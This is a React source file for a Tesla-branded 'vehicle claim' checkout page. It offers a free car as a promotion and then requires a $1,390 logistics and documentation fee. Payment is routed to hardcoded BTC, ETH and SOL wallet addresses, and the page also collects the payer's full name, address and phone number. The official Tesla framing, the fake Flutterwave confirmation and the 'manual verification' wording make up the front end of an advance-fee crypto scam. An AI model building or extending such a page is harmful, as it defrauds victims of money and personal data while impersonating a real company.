import React, { useState } from 'react';
import { useApp } from '../context/AppContext';
import {
  ShieldCheck,
  CheckCircle2,
  AlertCircle,
  Truck,
  ArrowRight,
  ArrowLeft,
  Lock,
  MapPin,
  Check,
  Copy,
  CreditCard,
  QrCode,
  ExternalLink,
  Wallet
} from 'lucide-react';
import { DeliveryAddress } from '../types';
import { TeslaLogo, TeslaEmblem, TeslaWordmark } from '../components/TeslaBranding';

type PaymentMethodType = 'cryptocurrency' | 'flutterwave';
type CryptoCurrencyType = 'BTC' | 'ETH' | 'SOL';

export const DemoCheckoutPage: React.FC = () => {
  const {
    selectedVehicle,
    currentUser,
    submitDemoClaim,
    navigateTo,
    showNotification
  } = useApp();

  const [address, setAddress] = useState<DeliveryAddress>(
    currentUser?.address || {
      fullName: currentUser?.fullName || '',
      email: currentUser?.email || '',
      phone: currentUser?.phone || '',
      streetAddress: '',
      apartmentOrSuite: '',
      city: '',
      stateOrRegion: '',
      postalCode: '',
      country: currentUser?.country || 'United States'
    }
  );

  // Flow step: 1 = Address & Acknowledgement, 2 = Payment Method & Payment
  const [currentStep, setCurrentStep] = useState<1 | 2>(1);

  // Acknowledgement Terms
  const [hasAcknowledgedTerms, setHasAcknowledgedTerms] = useState(false);
  const [hasAcknowledgedFees, setHasAcknowledgedFees] = useState(false);

  // Payment Selection
  const [selectedMethod, setSelectedMethod] = useState<PaymentMethodType>('cryptocurrency');
  const [selectedCrypto, setSelectedCrypto] = useState<CryptoCurrencyType>('BTC');
  const [cryptoTxId, setCryptoTxId] = useState('');
  const [copiedAddress, setCopiedAddress] = useState(false);

  // Submission State
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [confirmedClaim, setConfirmedClaim] = useState<{
    trackingNumber: string;
    method: string;
    reference: string;
    paymentStatus: string;
    cryptoAsset?: string;
  } | null>(null);

  if (!selectedVehicle) {
    return (
      <div className="min-h-screen bg-[#060607] text-white flex items-center justify-center p-6">
        <div className="text-center space-y-4">
          <div className="flex justify-center mb-2">
            <TeslaEmblem className="w-8 h-8" />
          </div>
          <p className="text-zinc-400">No vehicle selected for claim checkout.</p>
          <button
            onClick={() => navigateTo('explore')}
            className="px-6 py-2.5 bg-[#E82127] text-white font-bold text-xs uppercase tracking-wider rounded"
          >
            Explore Vehicles
          </button>
        </div>
      </div>
    );
  }

  const v = selectedVehicle;

  // Crypto deposit addresses - strictly verified receiving addresses per specification
  const cryptoWallets: Record<
    CryptoCurrencyType,
    { name: string; symbol: string; network: string; address: string }
  > = {
    BTC: {
      name: 'Bitcoin',
      symbol: 'BTC',
      network: 'Bitcoin (BTC Network)',
      address: 'bc1qlvfze8cmm3eu7etx9e8mjfstzng85t4zqqpx6a'
    },
    ETH: {
      name: 'Ethereum',
      symbol: 'ETH',
      network: 'Ethereum (ERC-20 Network)',
      address: '0x9460D45e3bbf68a39166DA91cbA6a57855054901'
    },
    SOL: {
      name: 'Solana',
      symbol: 'SOL',
      network: 'Solana (SOL Network)',
      address: 'J39Xw8kgB1cNedCAVuRdSfVNjMGipPVM3768RF7ZmZFx'
    }
  };

  const handleAddressChange = (field: keyof DeliveryAddress, val: string) => {
    setAddress(prev => ({ ...prev, [field]: val }));
  };

  const handleCopyCrypto = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedAddress(true);
    showNotification('Deposit address copied to clipboard.', 'success');
    setTimeout(() => setCopiedAddress(false), 2500);
  };

  const handleProceedToPayment = (e: React.FormEvent) => {
    e.preventDefault();

    if (!address.fullName || !address.email || !address.phone || !address.streetAddress || !address.city || !address.postalCode) {
      showNotification('Please fill in all mandatory delivery address fields.', 'error');
      return;
    }

    if (!hasAcknowledgedTerms || !hasAcknowledgedFees) {
      showNotification('Please accept the Acknowledgement Terms to proceed.', 'error');
      return;
    }

    setCurrentStep(2);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleFinalCheckout = async (e: React.FormEvent) => {
    e.preventDefault();

    setIsSubmitting(true);
    try {
      const isCrypto = selectedMethod === 'cryptocurrency';
      const paymentMethodName = isCrypto
        ? `Cryptocurrency (${cryptoWallets[selectedCrypto].name} - ${selectedCrypto})`
        : 'Flutterwave Secure Checkout';

      const transferRef = isCrypto
        ? (cryptoTxId.trim() || 'TX-' + Math.random().toString(36).substring(2, 10).toUpperCase())
        : 'FLW-' + Math.floor(10000000 + Math.random() * 90000000);

      const claim = await submitDemoClaim(v.id, address, {
        method: paymentMethodName,
        transferReference: transferRef,
        status: isCrypto ? 'Pending Manual Verification' : 'Evidence Submitted',
        cryptoAddress: isCrypto ? cryptoWallets[selectedCrypto].address : undefined,
        cryptoNetwork: isCrypto ? cryptoWallets[selectedCrypto].network : undefined,
        cryptoAsset: isCrypto ? selectedCrypto : undefined,
        notes: isCrypto
          ? `Cryptocurrency payment sent for $${v.totalMandatoryFeeUSD} USD. Asset: ${cryptoWallets[selectedCrypto].name} (${selectedCrypto}) to receiving address ${cryptoWallets[selectedCrypto].address}. Status: Pending Manual Verification.`
          : `Payment arranged via Flutterwave for $${v.totalMandatoryFeeUSD} USD logistics settlement.`
      });

      setConfirmedClaim({
        trackingNumber: claim.trackingNumber,
        method: paymentMethodName,
        reference: transferRef,
        paymentStatus: isCrypto ? 'Pending Manual Verification' : 'Evidence Submitted',
        cryptoAsset: isCrypto ? selectedCrypto : undefined
      });

      showNotification('Vehicle allocation order confirmed successfully!', 'success');
    } catch {
      showNotification('Encountered an error while processing checkout. Please try again.', 'error');
    } finally {
      setIsSubmitting(false);
    }
  };

  // Confirmation View
  if (confirmedClaim) {
    const isCrypto = confirmedClaim.method.toLowerCase().includes('crypto');
    return (
      <div className="min-h-screen bg-[#060607] text-white py-12 sm:py-20 px-3 sm:px-6 lg:px-8 flex items-center justify-center">
        <div className="max-w-xl w-full bg-zinc-950 border border-white/[0.1] rounded-xl sm:rounded-2xl p-5 sm:p-8 md:p-12 text-center space-y-6 shadow-2xl">
          <div className="flex flex-col items-center gap-3">
            <TeslaLogo variant="stacked" className="w-20 sm:w-24 h-auto" />
            <div className="w-14 h-14 rounded-full bg-emerald-950/70 border border-emerald-500/50 flex items-center justify-center text-emerald-400">
              <CheckCircle2 className="w-8 h-8" />
            </div>
          </div>

          <div className="space-y-2">
            <span className="text-xs font-bold uppercase tracking-widest text-[#E82127]">
              Order Confirmed · Allocation Staged
            </span>
            <h1 className="text-2xl sm:text-3xl font-black text-white font-display">
              Vehicle Claim Allocation Confirmed
            </h1>
            <p className="text-sm text-zinc-400">
              Your vehicle reservation and delivery coordinates have been successfully registered.
            </p>
          </div>

          <div className="p-4 bg-zinc-900 border border-zinc-800 rounded-lg text-center space-y-1">
            <span className="text-xs text-zinc-500 uppercase tracking-wider">Official Tracking Code</span>
            <p className="text-xl sm:text-2xl font-mono font-bold text-white tracking-wider">
              {confirmedClaim.trackingNumber}
            </p>
          </div>

          <div className="p-4 bg-zinc-900/50 rounded-lg text-left text-xs text-zinc-300 space-y-2.5 border border-zinc-800/80">
            <div className="flex justify-between pb-2 border-b border-zinc-800">
              <span className="text-zinc-500">Allocated Vehicle:</span>
              <span className="font-semibold text-white">{v.year} {v.model} {v.trim}</span>
            </div>
            <div className="flex justify-between pb-2 border-b border-zinc-800">
              <span className="text-zinc-500">Destination:</span>
              <span className="font-medium text-white">{address.city}, {address.stateOrRegion} {address.postalCode}</span>
            </div>
            <div className="flex justify-between pb-2 border-b border-zinc-800">
              <span className="text-zinc-500">Payment Option:</span>
              <span className="font-medium text-white">{confirmedClaim.method}</span>
            </div>
            <div className="flex justify-between pb-2 border-b border-zinc-800">
              <span className="text-zinc-500">Settlement Reference:</span>
              <span className="font-mono text-emerald-400 font-bold">{confirmedClaim.reference}</span>
            </div>
            <div className="flex justify-between pb-2 border-b border-zinc-800 items-center">
              <span className="text-zinc-500">Payment Status:</span>
              <span className={`px-2.5 py-0.5 rounded text-xs font-bold uppercase tracking-wider ${
                isCrypto
                  ? 'border border-amber-600/70 bg-amber-950/80 text-amber-300'
                  : 'border border-emerald-600/70 bg-emerald-950/80 text-emerald-300'
              }`}>
                {confirmedClaim.paymentStatus}
              </span>
            </div>
            <div className="flex justify-between items-center pt-1 text-sm font-bold">
              <span className="text-zinc-400">Total Mandatory Fee:</span>
              <span className="text-white">${v.totalMandatoryFeeUSD}.00 USD</span>
            </div>
          </div>

          {isCrypto && (
            <div className="p-3.5 bg-amber-950/30 border border-amber-600/40 rounded-lg text-left text-xs space-y-1">
              <div className="flex items-center gap-2 text-amber-300 font-bold">
                <AlertCircle className="w-4 h-4 shrink-0 text-amber-400" />
                <span>Pending Manual Verification</span>
              </div>
              <p className="text-[11px] text-zinc-400 leading-relaxed">
                Your payment submission is recorded as <strong>Pending Manual Verification</strong>. Cryptocurrency payments are never automatically verified or completed until manually confirmed by authorized Tesla Operations administrators.
              </p>
            </div>
          )}

          <div className="pt-4 flex flex-col sm:flex-row items-center justify-center gap-3">
            <button
              onClick={() => navigateTo('my-claims')}
              className="w-full sm:w-auto px-8 py-3.5 bg-[#E82127] hover:bg-[#b91318] text-white font-bold text-xs uppercase tracking-wider rounded transition-colors"
            >
              Track in My Claims
            </button>
            <button
              onClick={() => navigateTo('explore')}
              className="w-full sm:w-auto px-6 py-3.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 font-bold text-xs uppercase tracking-wider rounded border border-zinc-800 transition-colors"
            >
              Back to Catalog
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#060607] text-white pb-24">
      {/* Editorial Header */}
      <div className="bg-[#090A0C] border-b border-white/[0.08] py-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="max-w-3xl space-y-3">
            <div className="flex items-center gap-3">
              <TeslaEmblem className="w-7 h-7 sm:w-8 sm:h-8 shrink-0" />
              <span className="text-xs sm:text-sm font-bold uppercase tracking-widest text-[#E82127]">
                Official Vehicle Allocation Checkout
              </span>
            </div>
            <h1 className="text-3xl sm:text-4xl font-black tracking-tight text-white font-display">
              Vehicle Claim Checkout
            </h1>
            <p className="text-sm text-zinc-400">
              Review your selected electric vehicle, verify your private delivery destination, and
              complete itemized logistics fee settlement.
            </p>

            {/* Stepper progress */}
            <div className="pt-2 flex items-center gap-3 text-xs">
              <div className={`flex items-center gap-2 ${currentStep === 1 ? 'text-white font-bold' : 'text-zinc-500'}`}>
                <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[11px] ${currentStep === 1 ? 'bg-[#E82127] text-white' : 'bg-zinc-800 text-zinc-400'}`}>
                  1
                </span>
                <span>Delivery & Acknowledgement</span>
              </div>
              <span className="text-zinc-600">→</span>
              <div className={`flex items-center gap-2 ${currentStep === 2 ? 'text-white font-bold' : 'text-zinc-500'}`}>
                <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[11px] ${currentStep === 2 ? 'bg-[#E82127] text-white' : 'bg-zinc-800 text-zinc-400'}`}>
                  2
                </span>
                <span>Payment Method & Confirmation</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-8">
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
          
          {/* Left Column: Form Details based on Step */}
          <div className="lg:col-span-7 space-y-6">
            
            {currentStep === 1 ? (
              <form onSubmit={handleProceedToPayment} className="space-y-6">
                {/* Step 1: Delivery Address Form */}
                <div className="bg-zinc-950 border border-white/[0.08] rounded-xl p-4 sm:p-6 lg:p-8 space-y-6">
                  <div className="flex items-center justify-between pb-4 border-b border-zinc-900">
                    <div className="flex items-center gap-2">
                      <MapPin className="w-5 h-5 text-[#E82127]" />
                      <h2 className="text-lg font-bold text-white font-display">
                        Delivery Address & Recipient
                      </h2>
                    </div>
                    <span className="text-xs text-zinc-500">*All fields required</span>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Full Legal Name
                      </label>
                      <input
                        type="text"
                        required
                        value={address.fullName}
                        onChange={e => handleAddressChange('fullName', e.target.value)}
                        placeholder="Marcus Vance"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Email Address
                      </label>
                      <input
                        type="email"
                        required
                        value={address.email}
                        onChange={e => handleAddressChange('email', e.target.value)}
                        placeholder="marcus@example.com"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Phone Number (Carrier Contact)
                      </label>
                      <input
                        type="tel"
                        required
                        value={address.phone}
                        onChange={e => handleAddressChange('phone', e.target.value)}
                        placeholder="+1 (555) 019-2834"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Country
                      </label>
                      <select
                        value={address.country}
                        onChange={e => handleAddressChange('country', e.target.value)}
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      >
                        {v.eligibleCountries.map(c => (
                          <option key={c} value={c}>
                            {c}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div className="sm:col-span-2">
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Street Address (Ground Carrier Accessible)
                      </label>
                      <input
                        type="text"
                        required
                        value={address.streetAddress}
                        onChange={e => handleAddressChange('streetAddress', e.target.value)}
                        placeholder="1200 Performance Way"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div className="sm:col-span-2">
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Apartment / Suite / Gate Code (Optional)
                      </label>
                      <input
                        type="text"
                        value={address.apartmentOrSuite || ''}
                        onChange={e => handleAddressChange('apartmentOrSuite', e.target.value)}
                        placeholder="Apt 4B or Gate 102"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        City
                      </label>
                      <input
                        type="text"
                        required
                        value={address.city}
                        onChange={e => handleAddressChange('city', e.target.value)}
                        placeholder="Austin"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        State / Province / Region
                      </label>
                      <input
                        type="text"
                        required
                        value={address.stateOrRegion}
                        onChange={e => handleAddressChange('stateOrRegion', e.target.value)}
                        placeholder="Texas"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>

                    <div>
                      <label className="block text-zinc-400 uppercase tracking-wider font-semibold mb-1">
                        Postal / Zip Code
                      </label>
                      <input
                        type="text"
                        required
                        value={address.postalCode}
                        onChange={e => handleAddressChange('postalCode', e.target.value)}
                        placeholder="78701"
                        className="w-full bg-zinc-900 border border-zinc-800 rounded p-2.5 text-white focus:outline-none focus:border-[#E82127]"
                      />
                    </div>
                  </div>

                  <div className="pt-2 text-[11px] text-zinc-500">
                    Addresses are encrypted and retained strictly for carrier logistics scheduling.
                  </div>
                </div>

                {/* Acknowledgement Terms */}
                <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-4 sm:p-6 space-y-4">
                  <div className="flex items-start gap-3">
                    <ShieldCheck className="w-5 h-5 text-[#E82127] shrink-0 mt-0.5" />
                    <div className="space-y-1 text-xs">
                      <p className="font-bold text-white uppercase tracking-wider">
                        ACKNOWLEDGEMENT TERMS
                      </p>
                      <p className="text-zinc-400 leading-relaxed">
                        Please review the vehicle allocation and mandatory carrier logistics terms below.
                        Submitting generates your official claim tracking registration and initiates carrier dispatch coordination.
                      </p>
                    </div>
                  </div>

                  <div className="space-y-3 pt-2 text-xs">
                    <label className="flex items-start gap-3 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={hasAcknowledgedTerms}
                        onChange={e => setHasAcknowledgedTerms(e.target.checked)}
                        className="mt-0.5 rounded border-zinc-700 text-[#E82127] focus:ring-[#E82127]"
                      />
                      <span className="text-zinc-300">
                        I confirm that my delivery coordinates are accurate and I agree to the allocation guidelines.
                      </span>
                    </label>

                    <label className="flex items-start gap-3 cursor-pointer">
                      <input
                        type="checkbox"
                        checked={hasAcknowledgedFees}
                        onChange={e => setHasAcknowledgedFees(e.target.checked)}
                        className="mt-0.5 rounded border-zinc-700 text-[#E82127] focus:ring-[#E82127]"
                      />
                      <span className="text-zinc-300">
                        I have reviewed the itemized freight ($1,200) and documentation fee ($190) disclosure (${v.totalMandatoryFeeUSD}.00 USD total).
                      </span>
                    </label>
                  </div>
                </div>

                <button
                  type="submit"
                  className="w-full py-4 bg-[#E82127] hover:bg-[#b91318] text-white font-bold text-xs uppercase tracking-wider rounded transition-colors shadow-lg flex items-center justify-center gap-2"
                >
                  <span>Proceed to Choose Payment Method</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </form>
            ) : (
              /* Step 2: Choose Payment Method & Settlement */
              <form onSubmit={handleFinalCheckout} className="space-y-6">
                <div className="bg-zinc-950 border border-white/[0.08] rounded-xl p-4 sm:p-6 lg:p-8 space-y-6">
                  <div className="flex items-center justify-between pb-4 border-b border-zinc-900">
                    <div className="flex items-center gap-2">
                      <CreditCard className="w-5 h-5 text-[#E82127]" />
                      <h2 className="text-lg font-bold text-white font-display">
                        Choose Payment Method
                      </h2>
                    </div>
                    <button
                      type="button"
                      onClick={() => setCurrentStep(1)}
                      className="text-xs text-zinc-400 hover:text-white flex items-center gap-1"
                    >
                      <ArrowLeft className="w-3.5 h-3.5" />
                      <span>Back to Address</span>
                    </button>
                  </div>

                  {/* Payment Method Selector Cards */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {/* Option 1: Cryptocurrency */}
                    <div
                      onClick={() => setSelectedMethod('cryptocurrency')}
                      className={`p-4 rounded-xl border cursor-pointer transition-all ${
                        selectedMethod === 'cryptocurrency'
                          ? 'border-[#E82127] bg-[#E82127]/10'
                          : 'border-zinc-800 bg-zinc-900/50 hover:border-zinc-700'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <Wallet className="w-4 h-4 text-[#E82127]" />
                          <span className="font-bold text-sm text-white">Cryptocurrency</span>
                        </div>
                        <span className="px-2 py-0.5 text-[10px] uppercase font-bold rounded bg-zinc-800 text-zinc-300">
                          Instant
                        </span>
                      </div>
                      <p className="text-xs text-zinc-400 leading-relaxed">
                        Direct blockchain payment with Bitcoin (BTC), Ethereum (ETH), or Solana (SOL).
                      </p>
                    </div>

                    {/* Option 2: Flutterwave */}
                    <div
                      onClick={() => setSelectedMethod('flutterwave')}
                      className={`p-4 rounded-xl border cursor-pointer transition-all ${
                        selectedMethod === 'flutterwave'
                          ? 'border-[#E82127] bg-[#E82127]/10'
                          : 'border-zinc-800 bg-zinc-900/50 hover:border-zinc-700'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <CreditCard className="w-4 h-4 text-emerald-400" />
                          <span className="font-bold text-sm text-white">Flutterwave</span>
                        </div>
                        <span className="px-2 py-0.5 text-[10px] uppercase font-bold rounded bg-emerald-950 text-emerald-400 border border-emerald-800/40">
                          Verified
                        </span>
                      </div>
                      <p className="text-xs text-zinc-400 leading-relaxed">
                        Pay with Credit/Debit Card, Bank Transfer, or Mobile Money via Flutterwave.
                      </p>
                    </div>
                  </div>

                  {/* Payment Details Container */}
                  {selectedMethod === 'cryptocurrency' ? (
                    <div className="pt-4 border-t border-zinc-900 space-y-4">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold uppercase tracking-wider text-zinc-300">
                          Select Cryptocurrency Asset
                        </span>
                        <span className="text-xs text-zinc-500">Payable: ${v.totalMandatoryFeeUSD}.00 USD</span>
                      </div>

                      {/* Crypto Asset Tabs */}
                      <div className="grid grid-cols-3 gap-2">
                        {(['BTC', 'ETH', 'SOL'] as CryptoCurrencyType[]).map(asset => (
                          <button
                            key={asset}
                            type="button"
                            onClick={() => setSelectedCrypto(asset)}
                            className={`py-2.5 px-3 rounded text-xs font-bold tracking-wider transition-colors flex flex-col sm:flex-row items-center justify-center gap-1 ${
                              selectedCrypto === asset
                                ? 'bg-zinc-800 text-white border border-[#E82127]'
                                : 'bg-zinc-900 text-zinc-400 hover:text-white border border-zinc-800'
                            }`}
                          >
                            <span>{cryptoWallets[asset].name}</span>
                            <span className="text-[10px] text-zinc-500 font-mono">({cryptoWallets[asset].symbol})</span>
                          </button>
                        ))}
                      </div>

                      {/* Deposit Box */}
                      <div className="p-4 bg-zinc-900/70 border border-zinc-800 rounded-lg space-y-3.5">
                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs pb-3 border-b border-zinc-800">
                          <div>
                            <span className="text-zinc-500 block text-[11px] uppercase tracking-wider">Cryptocurrency:</span>
                            <span className="font-bold text-white text-sm">
                              {cryptoWallets[selectedCrypto].name} ({cryptoWallets[selectedCrypto].symbol})
                            </span>
                          </div>
                          <div>
                            <span className="text-zinc-500 block text-[11px] uppercase tracking-wider">Network:</span>
                            <span className="font-semibold text-zinc-200">
                              {cryptoWallets[selectedCrypto].network}
                            </span>
                          </div>
                        </div>

                        <div className="space-y-1.5">
                          <span className="text-[11px] text-zinc-400 font-semibold uppercase tracking-wider block">
                            Receiving Address ({cryptoWallets[selectedCrypto].symbol}):
                          </span>
                          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 bg-zinc-950 p-2.5 rounded border border-zinc-800">
                            <span className="font-mono text-xs text-white break-all flex-1 select-all py-1">
                              {cryptoWallets[selectedCrypto].address}
                            </span>
                            <button
                              type="button"
                              onClick={() => handleCopyCrypto(cryptoWallets[selectedCrypto].address)}
                              className="px-3 py-2 bg-zinc-800 hover:bg-zinc-700 text-white rounded text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors shrink-0"
                            >
                              {copiedAddress ? (
                                <>
                                  <Check className="w-3.5 h-3.5 text-emerald-400" />
                                  <span>Address Copied</span>
                                </>
                              ) : (
                                <>
                                  <Copy className="w-3.5 h-3.5" />
                                  <span>Copy Address</span>
                                </>
                              )}
                            </button>
                          </div>
                          <p className="text-[11px] text-zinc-500">
                            Send only {cryptoWallets[selectedCrypto].name} ({cryptoWallets[selectedCrypto].symbol}) to this receiving address via the {cryptoWallets[selectedCrypto].network}.
                          </p>
                        </div>

                        <div className="space-y-1.5 pt-1">
                          <label className="block text-xs font-semibold text-zinc-300">
                            Transaction Hash / TXID (Optional)
                          </label>
                          <input
                            type="text"
                            value={cryptoTxId}
                            onChange={e => setCryptoTxId(e.target.value)}
                            placeholder="e.g. 0x4f82... or b8a9..."
                            className="w-full bg-zinc-950 border border-zinc-800 rounded p-2.5 text-xs text-white focus:outline-none focus:border-[#E82127] font-mono"
                          />
                          <p className="text-[11px] text-zinc-500">
                            Optional: enter your transaction hash to assist manual verification.
                          </p>
                        </div>

                        <div className="p-3 bg-amber-950/20 border border-amber-800/40 rounded text-[11px] text-amber-300/90 leading-relaxed flex items-start gap-2">
                          <AlertCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                          <span>
                            After sending funds, click <strong>"I Have Made the Payment"</strong> below. Your payment will be recorded as <strong>"Pending Manual Verification"</strong> and verified by operations. Crypto payments are never automatically verified or completed.
                          </span>
                        </div>
                      </div>
                    </div>
                  ) : (
                    /* Flutterwave View */
                    <div className="pt-4 border-t border-zinc-900 space-y-4">
                      <div className="p-4 bg-zinc-900/60 border border-zinc-800 rounded-lg space-y-3">
                        <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
                          <div>
                            <span className="text-xs font-bold uppercase tracking-wider text-white block">
                              Flutterwave Payment Gateway
                            </span>
                            <span className="text-[11px] text-zinc-400">
                              Integrated Checkout for Cards, Bank Wire, and Transfers
                            </span>
                          </div>
                          <span className="font-bold text-base text-white tabular-nums">
                            ${v.totalMandatoryFeeUSD}.00 USD
                          </span>
                        </div>

                        <div className="space-y-2 text-xs text-zinc-300">
                          <div className="flex justify-between">
                            <span className="text-zinc-500">Payer Name:</span>
                            <span className="font-medium text-white">{address.fullName}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-zinc-500">Billing Email:</span>
                            <span className="font-medium text-white">{address.email}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-zinc-500">Payment Protection:</span>
                            <span className="text-emerald-400 font-medium">PCI-DSS Level 1 Certified</span>
                          </div>
                        </div>

                        <div className="p-3 bg-zinc-950 rounded border border-zinc-800/80 text-[11px] text-zinc-400 leading-relaxed">
                          Click below to confirm payment with Flutterwave. Your settlement receipt and allocation confirmation will be generated immediately.
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="pt-2">
                    <button
                      type="submit"
                      disabled={isSubmitting}
                      className="w-full py-4 bg-[#E82127] hover:bg-[#b91318] disabled:bg-zinc-800 disabled:text-zinc-600 text-white font-bold text-xs uppercase tracking-wider rounded transition-colors shadow-lg flex items-center justify-center gap-2"
                    >
                      {isSubmitting ? (
                        <span>
                          {selectedMethod === 'cryptocurrency'
                            ? 'Recording Payment as Pending Manual Verification...'
                            : 'Processing Allocation Settlement...'}
                        </span>
                      ) : (
                        <>
                          <span>
                            {selectedMethod === 'cryptocurrency'
                              ? 'I Have Made the Payment'
                              : `Pay $${v.totalMandatoryFeeUSD}.00 with Flutterwave`}
                          </span>
                          <ArrowRight className="w-4 h-4" />
                        </>
                      )}
                    </button>
                  </div>
                </div>
              </form>
            )}
          </div>

          {/* Right Column: Vehicle Summary & Itemized Order Breakdown */}
          <div className="lg:col-span-5 space-y-6">
            <div className="bg-zinc-950 border border-white/[0.08] rounded-xl p-4 sm:p-6 lg:p-8 space-y-6">
              <div className="flex items-center justify-between pb-3 border-b border-zinc-900">
                <h2 className="text-lg font-bold text-white font-display">
                  Selected Allocation
                </h2>
                <TeslaEmblem className="w-6 h-6 sm:w-7 sm:h-7 shrink-0" />
              </div>

              <div className="aspect-[16/9] w-full rounded-lg overflow-hidden bg-zinc-900 relative">
                <img
                  src={v.images.primary}
                  alt={v.model}
                  className="w-full h-full object-cover"
                  referrerPolicy="no-referrer"
                />
                <div className="absolute top-3 right-3 bg-zinc-950/80 px-2.5 py-1 rounded text-[11px] font-bold text-white">
                  {v.year}
                </div>
              </div>

              <div>
                <span className="text-xs text-zinc-500 uppercase">{v.colorName} · {v.allocationCode}</span>
                <h3 className="text-xl font-bold text-white font-display mt-0.5">
                  {v.model} <span className="text-zinc-400 font-normal">{v.trim}</span>
                </h3>
                <p className="text-xs text-zinc-400 mt-2">
                  Drivetrain: {v.specs.drivetrain} · Range: {v.specs.range}
                </p>
              </div>

              {/* Itemized USD Fee Calculation */}
              <div className="pt-4 border-t border-zinc-900 space-y-3 text-xs">
                <span className="font-semibold text-zinc-300 uppercase tracking-wider block">
                  Itemized Fee Breakdown
                </span>

                <div className="divide-y divide-zinc-900">
                  <div className="py-2.5 flex justify-between items-center">
                    <span className="text-zinc-400">Allocated Vehicle Purchase Price</span>
                    <span className="text-emerald-400 font-bold">$0.00 (Promotion)</span>
                  </div>
                  <div className="py-2.5 flex justify-between items-center text-zinc-300">
                    <span>Enclosed Transport Logistics Fee</span>
                    <span className="tabular-nums font-semibold">${v.deliveryFeeUSD}.00 USD</span>
                  </div>
                  <div className="py-2.5 flex justify-between items-center text-zinc-300">
                    <span>Filing & Title Documentation Fee</span>
                    <span className="tabular-nums font-semibold">${v.documentationFeeUSD}.00 USD</span>
                  </div>
                  <div className="py-3 flex justify-between items-center font-bold text-base text-white">
                    <span>Total Disclosed Amount</span>
                    <span className="tabular-nums">${v.totalMandatoryFeeUSD}.00 USD</span>
                  </div>
                </div>

                <div className="p-3 bg-zinc-900/40 rounded border border-zinc-800/80 text-[11px] text-zinc-400">
                  Settlement covers domestic enclosed carrier transit and title documentation.
                </div>
              </div>

              <button
                type="button"
                onClick={() => navigateTo('vehicle-details', v.id)}
                className="w-full text-center text-xs text-zinc-500 hover:text-white transition-colors"
              >
                ← Return to Vehicle Specifications
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
